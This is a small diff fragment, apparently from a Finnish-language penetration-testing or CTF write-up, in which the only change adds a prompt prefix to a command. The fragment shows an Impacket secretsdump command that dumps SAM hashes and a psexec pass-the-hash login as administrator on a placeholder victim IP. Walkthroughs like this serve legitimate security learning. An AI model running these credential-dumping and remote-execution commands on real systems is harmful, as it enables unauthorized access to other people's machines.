@@ -169,5 +169,5 @@ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hiv
 ```
 Ja kirjautuminen hasheja käyttämällä:
 ```console
-python3.9 /opt/impacket/examples/psexec.py -hashes q1w2e3r4t5y6u7iu:9o8i7u6y5t4r3e2w12q administrator@UHRIN_IP
+root@1.1.1.1> python3.9 /opt/impacket/examples/psexec.py -hashes q1w2e3r4t5y6u7iu:9o8i7u6y5t4r3e2w12q administrator@UHRIN_IP
 ```
